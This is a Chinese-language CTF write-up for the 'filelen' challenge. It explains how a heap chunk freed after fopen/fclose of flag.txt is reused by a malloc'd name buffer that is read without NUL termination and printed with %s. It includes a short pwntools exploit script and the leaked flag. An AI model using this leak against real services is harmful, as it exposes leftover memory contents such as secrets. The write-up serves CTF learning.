# filelen

## 题目简述

程序先打开用户指定文件并通过 `fseek/ftell` 获取长度，然后关闭 `FILE`；接着按用户声明的大小 `malloc` 名字缓冲区，并用 `read` 读入数据。`read` 不会自动补 `\0`，而程序最终用 `%s` 输出名字。

打开并关闭 `flag.txt` 后，glibc 的流对象及相关缓冲分配被释放到堆中；随后相近大小的 `malloc` 可复用这些堆块。若名字没有 NUL 结尾，`printf` 会越过名字继续打印残留堆数据。

## 解题过程

关键代码组合为：

```c
measure("flag.txt");
char *name = malloc(size);
read(0, name, size);       // 不保证 NUL 结尾
printf("Goodbye %s!\n", name);
```

让程序测量 `flag.txt`，声明较大的名字长度，但只发送一个非零字节。网络 `read` 可在收到当前短数据后返回，缓冲区剩余部分保持原堆内容，`%s` 因此继续泄露：

```python
from pwn import *

p = remote("HOST", PORT)
p.sendlineafter(b"> ", b"flag.txt")
p.sendlineafter(b"Length: ", b"100")
p.sendafter(b"Name: ", b"a")
p.recvuntil(b"Goodbye a")
print(p.recvline())
```

泄露结果中包含：

```text
greyhats{th3_fl4g_w4s_fr33_bu7_y0u_br0ught_1t_b4ck_bY_h34p_r3us3!}
```

## 方法总结

- 核心技巧：利用堆块复用和非 NUL 终止字符串，让 `%s` 越界读取已释放对象留下的数据。
- 识别信号：`malloc(size)` 后调用 `read`，没有显式写入 `name[n]=0`，随后把缓冲区当 C 字符串打印。
- 复用要点：利用依赖分配器尺寸和 IO 实现，声明长度与实际发送长度要分开控制；本地与远程 glibc 差异可能影响堆残留布局。
